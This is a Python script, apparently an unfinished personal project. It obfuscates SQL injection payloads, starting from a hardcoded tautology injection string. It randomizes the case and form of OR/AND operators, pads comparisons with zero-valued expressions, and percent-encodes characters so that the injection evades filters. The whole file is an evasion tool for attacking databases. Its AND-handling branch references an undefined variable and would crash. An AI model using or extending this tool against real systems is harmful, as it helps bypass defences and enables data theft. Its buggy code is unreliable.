import sys
import random

print()

print("Begin Obfuscator")

SQLcommands = ['\' OR 1=1#']

    
def replaceChars(string):
    
    i=0
    while i < len(string):
        flip = random.randint(0,1)#ChangeBased on likelyhood
        if(flip==0):
            numValue = format(ord(string[i]), "x")
            outString = "%"+str(numValue) #Do I need a "+" here?
            string = string[:i] + str(outString) + string[i+1:]
            i+=len(outString)
        i+=1
    return string
    
listOfZeros= ['0','2/2-1','8-8','2*3-6','SIN(0)']
def modifyEquality(string):# I need to add something earlier to check if there are spaces before or after the equality such that I am missing terms. 
    sides=string.split("=")
  
        
    for j in range(len(sides)):
        repetitions=random.randint(2,5)#arbitraryMaxes
       
        for i in range(repetitions):
            index = random.randint(0,len(listOfZeros)-1)
            frontBool= random.randint(0,1)
            if(frontBool):
                sides[j]=listOfZeros[index]+"+"+sides[j]
            else:
                sides[j]=sides[j]+"+"+listOfZeros[index]
   
    #Randomly select value
    return str( sides[0]+"=" +sides[1])


    
def changeLogicOperations (string): #Randomly chooses between written and signs, and adds extra meaningless extensions.
    orValues=[" OR "," Or "," or "," oR "," || "]
    andValues=[" AND "," aNd "," And "," aND "," and "," && "]#I should probably make text less likely.
    
    #TODO include spaces in s
    for element in orValues: 
        if (element in string): #TODO needs to be changed to not always pick first index
            print("FoundElement")
            p1, sep, p2 = string.partition(element)
            whichString=random.randint(0,len(orValues)-1)
            extraOr = orValues[whichString]+listOfZeros[random.randint(0,len(listOfZeros)-1)]
            
            whichString=random.randint(0,len(orValues)-1)
            string=p1+extraOr + orValues[whichString]+p2
            #Put useless or terms here
            
            
    for element in andValues:
        if (element in string):
            print("FoundElement")
            p1, sep, p2 = str1.partition(element)
            whichString=random.randint(0,len(andValues)-1)
            extraAND = andValues[whichString]+"1"
            whichString=random.randint(0,len(andValues)-1)
            
            string=p1+extraAND+andValues[whichString]+p2
                
    return string
    
def obfuscateCommand(string):
    sections=string.split("\'")
    output = ""
    for i in range(len(sections)):
        if(i%2==1):
            sections[i]=changeLogicOperations(sections[i])
            
            sections[i] = sections[i].replace(" =","=")
            sections[i]=sections[i].replace("= ","=")
            
            loopTemp=""
            terms=sections[i].split(" ")
            print(terms)
            for term in terms:
                removedHash = term
                postHash=""
                if("#" in removedHash):
                    removedHash, sep, postHash = removedHash.partition("#")
                    postHash="#"+postHash
                    
                if ("=" in removedHash):
                    print("Term is "+str(removedHash))
                    loopTemp+=" "+str(modifyEquality(removedHash))+postHash
                else:
                    loopTemp+=removedHash +postHash+" "
        else:
            loopTemp=str(sections[i])
            
        if(i<len(sections)-1):   
            loopTemp+="\'"
        output+=loopTemp
    #Add meaningless extra spaces?

    
    #COUNT How many open and close quotes (And ignore escaped characters.)
    
    openQuotes = sum(1 for i in range(len(output)) 
        if output.startswith("\'", i))
    escapedQuotes = sum(1 for i in range(len(output)) 
        if output.startswith("\\\'", i))
        
    if((openQuotes-escapedQuotes)%2==1):
        output+=""#USED TO BE # . I keep for the counting above.
    return output
    
    
print(random.randint(0,1))
outputCommand = obfuscateCommand(sys.argv[1])

print(outputCommand)
percentObfs= replaceChars(outputCommand)
print(percentObfs)
print(outputCommand)